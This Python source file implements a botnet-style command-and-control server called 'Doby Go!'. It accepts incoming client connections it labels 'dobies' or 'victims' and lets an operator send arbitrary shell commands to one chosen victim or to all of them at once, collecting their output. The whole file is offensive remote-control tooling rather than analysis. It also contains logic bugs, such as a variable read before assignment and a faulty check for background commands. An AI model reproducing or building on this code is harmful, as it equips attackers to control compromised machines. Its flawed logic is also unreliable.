import os
import socket
import select
from concurrent.futures import ThreadPoolExecutor, as_completed

hello_screen = """
  ____            _                  ____           _ 
 |  _ \    ___   | |__    _   _     / ___|   ___   | |
 | | | |  / _ \  | '_ \  | | | |   | |  _   / _ \  | |
 | |_| | | (_) | | |_) | | |_| |   | |_| | | (_) | |_|
 |____/   \___/  |_.__/   \__, |    \____|  \___/  (_)
                          |___/                       

                                by maroodb © 2017 v. 1.0

"""


def handle():
    global dobies_list
    go_on = True
    broadcast = False
    global leaving
    print(hello_screen)
    while go_on:
        cmd = input(">>")
        if cmd == "leave":
            go_on = False
            leaving = True
            print(">>>>>>>>>>>>>>>>>>> Good Bye ! <<<<<<<<<<<<<<<<<<\nPLEASE WAIT UNTIL KILLING ALL PROCESS")
            return "Done killing $$$Master Terminal$$..."
        elif cmd == "kill your self":
            pass
        elif broadcast:
            dobies_answers = []
            for dob in dobies_list:
                dob.send(cmd.encode('utf-8'))
                answer = dob.recv(4096)
                answer_decoded = answer.decode('utf-8')
                dobies_answers.append(answer_decoded)
            print(dobies_answers)

        elif cmd == "dobies -l":
            count = 0
            for doby in dobies_list:
                print("-->" + str(count))
                count += 1
            if count > 0:
                print("-->ALL")
            victim_id = input("Choose victim >>")
            if victim_id == "ALL":
                broadcast = True
        else:
            if victim_id == -1:
                print("ERROR! :You didn't choose a victim")
                victim_id = input("Choose victim>>")
                broadcast = False
            elif len(dobies_list) == 0:
                print("There is no connected Dobies.. wait")
            else:
                print("Running: <<"+cmd+">>")
                client = dobies_list[int(victim_id)]

                try:
                    client.send(cmd.encode('utf-8'))
                except socket.timeout:
                    print("Timeout exceeded.. try <<show me victims>> again")

                if cmd[:-1] != "&":

                    try:
                        data = client.recv(4096)
                        print(data.decode("utf-8"))
                    except socket.timeout:
                        print("I cant receive doby answer..")
                else:
                    print("Done ..")


def welcome_new_dobies(server):
    global pending_dobies
    global dobies_list
    global leaving
    while not leaving:
        pending_dobbies, wlist, xlist = select.select([server], [], [], 10)
        for doby in pending_dobbies:
            doby_soc, infos_doby = doby.accept()
            doby_soc.settimeout(2)
            dobies_list.append(doby_soc)
            doby_soc.send(b"salkou7")
    return "Done killing dobies hunter.."


def main():
    URL = "127.0.0.1"
    port = 7771
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((URL, port))
    server.listen(5)

    # pending_dobbies, wlist, xlist = select.select([server], [], [], 60)
    with ThreadPoolExecutor(max_workers=5) as executor:
        ask_process = executor.submit(handle)
        welcome_dobies = executor.submit(welcome_new_dobies, server)
        tasks = as_completed([ask_process, welcome_dobies])
        for task in tasks:
            print(task.result())


if __name__ == '__main__':
    dobies_list = []
    pending_dobies = []
    leaving = False
    main()
